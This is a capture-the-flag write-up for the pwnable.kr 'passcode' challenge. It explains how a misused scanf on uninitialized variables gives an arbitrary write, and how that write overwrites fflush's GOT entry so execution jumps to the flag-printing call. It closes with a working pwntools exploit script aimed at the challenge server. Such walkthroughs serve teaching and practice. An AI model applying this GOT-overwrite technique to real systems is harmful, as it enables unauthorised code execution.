---
title: "Passcode - pwnable.kr"
date: 2024-11-15T10:30:00Z
category: "ctf"
tags: ["pwnable", "CTF", "Write-What-Where"]
challenge_category: "pwn"
challenge_points: 20
challenge_solves: 350
summary: "Writeup of the pwnable passcode CTF Challenge"
ctf_name: "pwnable.kr"
image: "https://pwnable.kr/img/passcode.png"
image_fit: "contain"
---

# Passcode - Pwnable.kr
## Understanding the Mitigations
The challenge description is as follows:
```
Mommy told me to make a passcode based login system.

My initial C code was compiled without any error!

Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)

```
Were given two files, the binary itself, and the source code.

Running this through my tool, [elfsec](https://github.com/gracecondition/elfsec):
{{< figure src="/images/passcode/screenshot1.png" width="100%" align="center" >}}

PIE is disabled, but other than that, all common mitigations are on.
## Reading the source code
Heres ``passcode.c``:
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
		setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.1 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```
### The bugs in the source code
#### Incorrect usage of scanf()
The value that is passed into scanf needs to be a pointer to a variable.
More specifically, the correct way to pass a variable to scanf is using the ``&`` symbol since its expecting a pointer. 
### Uninitialized Data Usage
Due to the way scanf is being used, and the variables its reading from ``passcode1`` & ``passcode2`` being unitialized,
we have an Uninitialized Data Access (UDA) bug.
This means that scanf is going to fetch random data from the stack at the stack offset of passcode1 and passcode2.
### Write what were
When the first scanf happens, its going to write whatever we give it, to whatever happened to be in the stack at the memory address
``passcode1`` points to.

It helps to think of scanf like this:
```c
scanf(stdin, "%d", passcode1);
```
## Exploitation
### Finding the offsets
Using pwndbg, I found the following offset:

{{< figure src="/images/passcode/screenshot2.png" width="100%" align="center" >}}

From this we can gather that I can set values in the ``eax`` register, and the ``edx`` register,
which further coroborates that there is an arbitrary write bug here.
### Finding the necessary addresses:
For this exploit, im thinking of overwriting the Global Offset Table (GOT), a table where external functions are linked to at runtime.
Since this binary is only partial relro, the global offset table is writeable.
If you have no clue what any of that means, please read me other [blogpost](http://gracecondition.github.io/posts/machsec-documentation/)
But put simply, this is a table that contains the addresses of external functions. If we overwrite one of this table's functions address,
the next time that specific function is called, our own code will be run instead.
on the various kinds of mitigations available on modern Unix based operating systems.

First, we need to find where a function we want to overwrite is located on the global offset table:
This can be done rather easily with IDA Pro, or pwndbg. To each their own.


{{< figure src="/images/passcode/screenshot3.png" width="100%" align="center" >}}

Now we also need to figure out where we need to redirect code execution. 

Looking at it in IDA, again:
{{< figure src="/images/passcode/screenshot4.png" width="100%" align="center" >}}

The reason we are jumping to this specific section of the code, is because we need to have the two calls that set permissions properly
in order for the binary to have sufficient permissions to read the flag.

### Final exploit source code
Using pwntools, I devised the following exploit:
```python3
from pwn import *

context.binary = ELF('./passcode')
elf = context.binary
context.arch = 'i386'

fflush_got     = 0x0804C014
system_gadget  = 0x080492A1
offset = 96

# SSH connection (this is the only correct way)
s = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')
p = s.process('./passcode')

payload  = b"A" * offset
payload += p32(fflush_got)

p.sendline(payload)
p.sendline(str(system_gadget).encode())

p.interactive()
```
And thats it, we get the flag.

!pwn!

